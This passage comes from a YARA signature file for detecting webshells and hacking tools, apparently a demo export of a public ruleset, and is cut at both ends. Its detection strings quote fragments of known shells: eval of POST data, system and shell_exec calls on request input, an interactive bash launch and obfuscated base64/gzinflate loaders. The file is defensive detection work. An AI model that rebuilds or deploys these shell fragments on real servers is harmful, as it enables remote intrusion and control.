      $s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'." 
      $s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
   condition: 
      1 of them
} 

rule WebShell_STNC_WebShell_v0_8_RID30CF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
      $s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()" 
      $s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw" 
   condition: 
      2 of them
} 

rule WebShell_Web_shell__c_ShAnKaR_RID3203 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 13:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
      $s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump" 
      $s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
      $s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
   condition: 
      2 of them
} 

rule WebShell_Gamma_Web_Shell_RID303D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
      $s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
      $s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
      $s20 = "my $command = $self->query('command');" fullword
   condition: 
      2 of them
} 

rule WebShell_php_webshells_aspydrv_RID335E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aspydrv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files" 
      $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
      $s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
      $s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
      $s20 = "' ---Copy Too Folder routine Start" fullword
   condition: 
      3 of them
} 

rule WebShell_JspWebshell_1_2_2_RID309B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
      $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java." 
      $s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
      $s15 = "endPoint=random1.getFilePointer();" fullword
      $s20 = "if (request.getParameter(\"command\") != null) {" fullword
   condition: 
      3 of them
} 

rule WebShell_g00nshell_v1_3_RID2F6B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
      $s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
      $s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
      $s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
      $s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
   condition: 
      2 of them
} 

rule WebShell_php_include_w_shell_RID325E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file php-include-w-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
      $s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
      $s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
   condition: 
      1 of them
} 

rule WebShell_PhpSpy_Ver_2006_RID2F9D : DEMO T1007 T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 12:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1007, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
      $s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname." 
      $s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32" 
      $s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'" 
   condition: 
      1 of them
} 

rule WebShell_ZyklonShell_RID2F05 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file ZyklonShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
      $s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
      $s2 = "<TITLE>404 Not Found</TITLE>" fullword
      $s3 = "<H1>Not Found</H1>" fullword
   condition: 
      all of them
} 

rule WebShell_php_webshells_myshell_RID3353 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file myshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu" 
      $s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o" 
      $s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
      $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT" 
   condition: 
      1 of them
} 

rule WebShell_php_webshells_lolipop_RID3354 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file lolipop.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:43:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$commander = $_POST['commander']; " fullword
      $s9 = "$sourcego = $_POST['sourcego']; " fullword
      $s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
   condition: 
      all of them
} 

rule WebShell_simple_cmd_RID2EA3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file simple_cmd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:23:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
      $s2 = "<title>G-Security Webshell</title>" fullword
      $s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
      $s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
   condition: 
      1 of them
} 

rule WebShell_aZRaiLPhp_v1_0_RID2F66 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED" 
      $s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
      $s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
      $s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
   condition: 
      2 of them
} 

rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 20:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</" 
      $s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh" 
      $s11 = " *   Coded by Pixcher" fullword
      $s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
   condition: 
      2 of them
} 

rule WebShell_Generic_PHP_7_RID2F20 : DEMO GEN T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
      $s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
      $s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
      $s4 = "if( $action == \"dumpTable\" )" fullword
   condition: 
      2 of them
} 

rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
      $s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
      $s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
   condition: 
      2 of them
} 

rule WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 21:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
   condition: 
      all of them
} 

rule WebShell_Generic_PHP_6_RID2F1F : DEMO GEN T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
      $s5 = "echo shell_exec($com);" fullword
      $s7 = "if($sertype == \"winda\"){" fullword
      $s8 = "function execute($com)" fullword
      $s12 = "echo decode(execute($cmd));" fullword
      $s15 = "echo system($com);" fullword
   condition: 
      4 of them
} 

rule HKTL_Unpack_Injectt_RID2E35 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Injectt.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "%s -Run                              -->To Install And Run The Service" 
      $s3 = "%s -Uninstall                        -->To Uninstall The Service" 
      $s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN" 
   condition: 
      all of them
} 

rule Webshell_ASP_CmdAsp_2_RID2EB2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file CmdAsp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 11:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "' -- Read the output from our command and remove the temp file -- '" 
      $s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" 
      $s9 = "' -- create the COM objects that we will be using -- '" 
   condition: 
      all of them
} 

rule MAL_vanquish_RID2BB9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file vanquish.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 09:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged" 
      $s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU" 
      $s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z" 
   condition: 
      all of them
} 

rule HKTL_shelltools_g0t_root_uptime_RID336C : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file uptime.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-06 14:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "JDiamondCSlC~" 
      $s1 = "CharactQA" 
      $s2 = "$Info: This file is packed with the UPX executable packer $" 
      $s5 = "HandlereateConso" 
      $s7 = "ION\\System\\FloatingPo" 
   condition: 
      all of them
} 

rule PHP_Cloaked_Webshell_SuperFetchExec_RID347D : DEMO T1036 T1100 T1136 WEBSHELL {
   meta:
      description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
      author = "Florian Roth"
      reference = "http://goo.gl/xFvioC"
      date = "2014-04-05 15:32:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1036, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);" 
   condition: 
      $s0
} 

rule WebShell_RemExp_asp_php_RID3021 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 12:26:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
      $s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
      $s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
      $s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
      $s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
   condition: 
      all of them
} 

rule WebShell_dC3_Security_Crew_Shell_PRiV_RID351E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-05 15:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
      $s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
      $s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
      $s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
      $s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
      $s20 = "if (isset($_GET['rename_all'])) {" fullword
   condition: 
      3 of them
} 

rule DarkSecurityTeam_Webshell_RID3107 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Dark Security Team Webshell"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-02 13:05:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
   condition: 
      1 of them
} 

rule Webshell_perlbot_pl_RID2ED9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file perlbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")" 
      $s1 = "#Acesso a Shel - 1 ON 0 OFF" 
   condition: 
      1 of them
} 

rule Webshell_php_backdoor_php_RID3139 : DEMO MAL T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file php-backdoor.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://michaeldaw.org   2006" 
      $s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win" 
      $s3 = "coded by z0mbie" 
   condition: 
      1 of them
} 

rule Webshell_shellbot_pl_RID2F3E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shellbot.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:48:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ShellBOT" 
      $s1 = "PacktsGr0up" 
      $s2 = "CoRpOrAtIoN" 
      $s3 = "# Servidor de irc que vai ser usado " 
      $s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)" 
   condition: 
      2 of them
} 

rule Webshell_jsp_reverse_jsp_2_RID318B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file jsp-reverse.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// backdoor.jsp" 
      $s1 = "JSP Backdoor Reverse Shell" 
      $s2 = "http://michaeldaw.org" 
   condition: 
      2 of them
} 

rule Webshell_Tool_asp_RID2DE7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Tool.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "mailto:rhfactor@antisocial.com" 
      $s2 = "?raiz=root" 
      $s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE" 
      $s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0" 
   condition: 
      2 of them
} 

rule Webshell_NT_Addy_asp_RID2ECC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file NT Addy.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "NTDaddy v1.9 by obzerve of fux0r inc" 
      $s2 = "<ERROR: THIS IS NOT A TEXT FILE>" 
      $s4 = "RAW D.O.S. COMMAND INTERFACE" 
   condition: 
      1 of them
} 

rule Webshell_phvayvv_php_php_RID3108 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phvayvv.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "{mkdir(\"$dizin/$duzenx2\",777)" 
      $s1 = "$baglan=fopen($duzkaydet,'w');" 
      $s2 = "PHVayv 1.0" 
   condition: 
      1 of them
} 

rule Webshell_r57shell_php_php_RID30EA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file r57shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx " 
      $s2 = "RusH security team" 
      $s3 = "'ru_text12' => 'back-connect" 
   condition: 
      1 of them
} 

rule Webshell_rst_sql_php_php_RID30FC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rst_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\tmp\\dump_" 
      $s1 = "RST MySQL" 
      $s2 = "http://rst.void.ru" 
      $s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';" 
   condition: 
      2 of them
} 

rule Webshell_c99madshell_v2_0_php_php_RID33A9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file c99madshell_v2.0.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef" 
   condition: 
      all of them
} 

rule Webshell_telnet_pl_RID2E6D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file telnet.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "W A R N I N G: Private Server" 
      $s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   " 
   condition: 
      all of them
} 

rule Webshell_w3d_php_php_RID2F02 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file w3d.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "W3D Shell" 
      $s1 = "By: Warpboy" 
      $s2 = "No Query Executed" 
   condition: 
      2 of them
} 

rule Webshell_WebShell_cgi_RID2F4E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file WebShell.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WebShell.cgi" 
      $s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else" 
   condition: 
      all of them
} 

rule Webshell_WinX_Shell_html_RID3097 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file WinX Shell.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:46:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WinX Shell" 
      $s1 = "Created by greenwood from n57" 
      $s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>" 
   condition: 
      2 of them
} 

rule Webshell_csh_php_php_RID2F32 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file csh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ".::[c0derz]::. web-shell" 
